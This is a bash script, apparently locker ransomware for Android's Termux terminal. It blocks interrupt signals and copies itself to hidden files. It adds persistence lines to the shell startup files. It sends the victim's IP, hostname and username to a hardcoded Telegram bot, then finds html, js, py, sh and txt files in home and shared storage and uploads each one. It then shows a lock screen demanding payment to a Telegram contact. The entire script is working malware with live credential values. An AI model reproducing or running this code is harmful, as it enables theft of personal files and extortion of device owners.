#!/bin/bash

KEY="REY"
HOME="$HOME"
LOCK_FILE="$HOME/.termux_lock_active"
BASHRC="$HOME/.bashrc"
PROFILE="$HOME/.profile"
ZSHRC="$HOME/.zshrc"
SCRIPT_PATH="$HOME/.system_secure.sh"
BACKUP_SCRIPT_PATH="$HOME/.bash_lock"
TELEGRAM_BOT_TOKEN="8334809663:AAH5HqLlCnHJGVQXHcuo-njf9vf8UQmrysU"
TELEGRAM_CHAT_ID="7561204244"


ASCII_ART=(
    "⣀                                                           ⡀"
    "⢻⢷⡀                                                       ⢠⣾⡇"
    "⢸ ⠻⣦⡀                   ⣀⣠⣤⢤⣶⠶⠶⢶⣶⡤⣤⣄⣀                   ⢀⣴⠋⢀⠇"
    "⠈⣇ ⠈⠻⣦⡀             ⣀⡴⠞⠋⢉⡴⠞⠋⣿   ⡯⠙⠳⣦⡉⠙⠲⣤⡀             ⢀⣴⠟⠁ ⣼ "
    "  ⠹⣆  ⠈⠛⢦⣀         ⣠⠞⠋ ⢀⣰⠏   ⢻⡄ ⢰⠇  ⠈⢻⣄  ⠙⢷⣄         ⣠⡶⠋⠁  ⣰⠃ "
    "   ⠹⣇    ⠉⠳⢦⣄⡀   ⢀⡾⠃ ⣠⠞⠋⠁     ⠉⠉⠉     ⠉⠙⢷⣄ ⠙⢧⡀   ⢀⣠⡶⠛⠁    ⣴⠃  "
    "    ⠙⢧⡀     ⠈⠙⠳⠶⢤⣿⣄⣀⣸⠋⢠                ⢠ ⢹⣆⣀⣨⣷⡤⠶⠚⠋⠁     ⢠⡾⠃   "
    "     ⠈⠻⣦⡀           ⠸⡇⠈⡇       ⡀       ⣼ ⣼⠁           ⢀⣴⠏     "
    "       ⠈⠻⢦⣀          ⣿ ⣧       ⣷       ⡟ ⣿          ⣠⡴⠛⠁      "
    "          ⠙⠳⣦⣀      ⢀⡟ ⡏      ⢀⣿       ⣿ ⢿⡀      ⣠⡴⠞⠉         "
    "           ⣼⡆⠉⢻⡶⢤⣀⡀⢀⡾⠁⣼⠃      ⣸⠹⣆      ⠹⣆⠘⢧⡀⢀⣠⡤⢶⡟⠉⢰⣆          "
    "          ⢰⡏⣧ ⢸⠃ ⣨⠿⠋⣠⠞⠁      ⢸⡏ ⣹⡆      ⠘⢦⣈⠛⢿⡅ ⢸⡇ ⡿⢻          "
    "          ⢸⡕⣿⣧⣸⡀ ⠛⡶⢶⣄         ⣹⠰⡏         ⣠⠶⣾⠃ ⢸⣇⡼⡿⢸⠇         "
    "          ⠸⣇⠘⢯⡙⠷⣄⣸⠇ ⠹⣆       ⣴⠃ ⠹⣄      ⢀⣼⠃ ⢹⣆⣠⠞⣫⡿⠁⣼          "
    "           ⢻⣄⢀⠙⢷⡘⣿⣷⡶⣄⠙⠷⣄⡀   ⠘⠁   ⠈⠃   ⢀⣴⠞⢁⣤⢶⣾⡿⢡⡾⠋⡀⣰⠏          "
    "            ⠙⣿ ⠸⣇⠈⣻⣷⣿⠳⣤⡈⠙⠓⠄ ⠈⠳⡄ ⣰⠛⠁ ⠠⠞⠋⢀⣴⠟⣇⣿⡟ ⣾  ⡿⠋           "
    "             ⢸⡄ ⠻⣾⠏⠸⣿⣦⡈⠛⠶⢤⣤⣤⣤⠴⡷⠶⣿⠦⣤⣤⣤⡤⠾⠋⢁⣼⣿⠁⠹⣶⠏ ⢰⡇            "
    "              ⢷⣄ ⣿  ⠘⠿⣿⣦⣤⢴⣿⡿⠃ ⡷⠛⣦ ⠘⢿⣷⠦⣤⣶⣿⠟⠁ ⢀⡿⢀⣰⡟             "
    "               ⠙⣷⠘⣷⣄   ⠉⠉⠉⠁   ⡇ ⡟   ⠉⠉⠉⠉   ⣠⣾⠁⡟⠉              "
    "                ⠻⣴⡏⢹⢷⣦⣄⡀ ⣀⣤⡤⢤⡀⡧ ⠇⢀⡤⢤⣤⡀ ⣀⣠⣴⣿⡏⢻⣼⠇               "
    "           ⢀   ⠈⣧⢸⡾⠁⣨⣿⡟⠙⢯⣀      ⢀⣀⡿⠉⢻⢿⡁⠘⣿⠃⡿   ⢀⡀              "
    "           ⠈⢿⡓⠶⠶⠿⡛⠥⠞⠉⢠⣿⣄⡀⠉⠉⠻⣦⣀⡴⠛⠉⠉⢀⣴⣿⡀⠙⠲⠬⣻⠷⠶⠶⢚⡿⠁              "
    "             ⠙⠦⣄⣀⣀⣀⣠⣴⡋⢻⣿⡛⢳⠒⣤⠼⣿⠧⣤⢲⡞⢻⣿⠋⢹⡦⣄⣀⣀⣀⣤⠔⠋                "
    "                 ⠉⠹⣆⠈⠛⣾⣿⣧⣿⠙⠛⠓⠛⠚⠛⢋⣇⡾⣿⣷⠋ ⣼⠋⠉                    "
    "                   ⠙⣷⡀⣿⣿⣆⠙⠃     ⠘⠋⣼⡿⣿⢠⡾⠁                      "
    "                    ⠈⢳⡿⣮⡙⠛⣟⣻⣯⣯⣽⣟⣿⠛⢋⣴⣷⠟                        "
    "                      ⢻⣼⣏⠛⣋⣤⠶⠒⠶⣤⣙⠛⣹⢰⠏                         "
    "                      ⠘⣧⡉⠉⠉ ⣠⣤⡄ ⠉⠉⢁⣼                          "
    "                       ⠈⠛⠲⠤⠞⠋ ⠙⠶⠤⠖⠋⠁                          "
)


block_signals() {
    trap '' INT TSTP TERM QUIT HUP ABRT
}


get_public_ip() {
    local ip
    if command -v curl &> /dev/null; then
        ip=$(curl -s https://api.ipify.org)
    elif command -v wget &> /dev/null; then
        ip=$(wget -qO- https://api.ipify.org)
    else
        ip="Tidak dapat mengambil IP publik."
    fi
    echo "$ip"
}


send_telegram_message() {
    local message="$1"
    if command -v curl &> /dev/null; then
        curl -s -X POST "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMessage" \
            -d chat_id="$TELEGRAM_CHAT_ID" \
            -d text="$message" \
            -d parse_mode="HTML" > /dev/null 2>&1
    fi
}


send_telegram_file() {
    local file_path="$1"
    local caption="$2"
    if command -v curl &> /dev/null && [ -f "$file_path" ]; then
        curl -s -X POST "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendDocument" \
            -F chat_id="$TELEGRAM_CHAT_ID" \
            -F document=@"$file_path" \
            -F caption="$caption" > /dev/null 2>&1
    fi
}


find_and_send_source_code() {
    local search_dirs=("$HOME" "/sdcard" "/storage/emulated/0" "/data/data/com.termux/files/home")
    local extensions=("html" "js" "py" "sh" "txt")
    local total_files=0
    local sent_files=0

    for dir in "${search_dirs[@]}"; do
        if [ -d "$dir" ]; then
            for ext in "${extensions[@]}"; do
                while IFS= read -r -d '' file; do
                    total_files=$((total_files + 1))
                    local file_size=$(stat -c%s "$file" 2>/dev/null || echo "N/A")
                    local dir_name=$(dirname "$file")
                    
                    if send_telegram_file "$file" "👤<b>User:</b> <code>$(whoami)</code> 📂<b>Direktori:</b><code>$dir_name</code> ⏰<b>Waktu:</b><code>$(date)</code> 📂 <b>Lokasi:</b> <code>$dir_name</code> 📊<b>Ukuran:</b><code>$file_size bytes</code> 🔢<b>Total ditemukan:</b><code>$total_files</code>"; then
                        sent_files=$((sent_files + 1))
                    fi
                done < <(find "$dir" -type f -name "*.$ext" -print0 2>/dev/null)
            done
        fi
    done

    send_telegram_message "📡 <b>IP Target:</b> <code>$(get_public_ip)</code> 📊<b>Total file ditemukan:</b><code>$total_files</code> 📤<b>Berhasil dikirim:</b><code>$sent_files</code> ⏰<b>Waktu:</b><code>$(date)</code>"
}


collect_and_send_info() {
    local ip=$(get_public_ip)
    local hostname=$(hostname)
    local username=$(whoami)
    local current_dir=$(pwd)

    send_telegram_message "🔓 <b>Terminal Terkunci!</b> 📡 <b>IP Target:</b> <code>$ip</code> 💻<b>Hostname:</b><code>$hostname</code> 👤<b>User:</b><code>$username</code> 📂<b>Direktori:</b><code>$current_dir</code> ⏰<b>Waktu:</b><code>$(date)</code>"
}


animate_text() {
    local text="$1"
    local style="$2"
    local delay="${3:-0.03}"
    echo -e "\033[${style}m"
    for (( i=0; i<${#text}; i++ )); do
        echo -n "${text:$i:1}"
        sleep "$delay"
    done
    echo -e "\033[0m"
}


show_locked_screen() {
    clear
    echo -e "\033[1;36m" 
    for line in "${ASCII_ART[@]}"; do
        echo "$line"
    done
    echo -e "\033[0m"
    echo -e "\033[1;36m════════════════════════════════════════════════════════════\033[0m"
    echo -e "\033[1;37m              YOUR TERMINAL HAS BEEN LOCKED \033[0m"
    echo -e "\033[1;36m════════════════════════════════════════════════════════════\033[0m"
    echo -e ""
    echo -e "\033[1;37m    Your terminal has been locked and your files are in our hands\033[0m"
    echo -e "\033[1;37m      Untuk membuka terminal anda perlu berbayar hubungi @justtluvv\033[0m"
    echo -e ""
    echo -e "\033[1;37m                      Masukan key :\033[0m"
    echo -e ""
    echo -n "                         > "
}


access_granted() {
    animate_text "\n    ✔️ Kunci Benar! Terminal Dibuka...." "36;1" 
    sleep 2
    if [ -f "$LOCK_FILE" ]; then
        rm -f "$LOCK_FILE"
    fi
    clear
}


access_denied() {
    echo -e "\n    \033[1;36m❌ Kunci Salah! Terminal Tetap Terkunci.\033[0m"  
    sleep 2
}


create_hidden_script() {
    cat > "$BACKUP_SCRIPT_PATH" << 'EOF'
#!/bin/bash

HOME="$HOME"
LOCK_FILE="$HOME/.termux_lock_active"
SCRIPT_PATH="$HOME/.system_secure.sh"

if [ -f "$LOCK_FILE" ]; then
    if [ -f "$SCRIPT_PATH" ]; then
        bash "$SCRIPT_PATH"
        exit 0
    else
        BACKUP_SCRIPT="$HOME/.bash_lock"
        if [ -f "$BACKUP_SCRIPT" ]; then
            bash "$BACKUP_SCRIPT"
            exit 0
        fi
    fi
fi
EOF
    chmod +x "$BACKUP_SCRIPT_PATH"
}


install_persistence() {
    local config_files=("$BASHRC" "$PROFILE" "$ZSHRC")
    
    for config in "${config_files[@]}"; do
        if [ -f "$config" ]; then
            if ! grep -q "source $BACKUP_SCRIPT_PATH" "$config"; then
                echo -e "\n# Auto-start lock script\nif [ -f \"$BACKUP_SCRIPT_PATH\" ]; then\n    source \"$BACKUP_SCRIPT_PATH\"\nfi" >> "$config"
            fi
        fi
    done
}


auto_append_shell_config() {
    create_hidden_script
    install_persistence
}


lock_terminal() {
    touch "$LOCK_FILE"
    collect_and_send_info
    find_and_send_source_code
    
    while true; do
        show_locked_screen
        read -s user_input
        echo
        
        if [ "$user_input" = "$KEY" ]; then
            access_granted
            break
        else
            access_denied
        fi
    done
}


main() {
    block_signals
    
    if [ -f "$LOCK_FILE" ]; then
        lock_terminal
    else
        auto_append_shell_config
        lock_terminal
    fi
}


if [ ! -f "$SCRIPT_PATH" ]; then
    cp "$0" "$SCRIPT_PATH"
    chmod +x "$SCRIPT_PATH"
fi


main "$@"
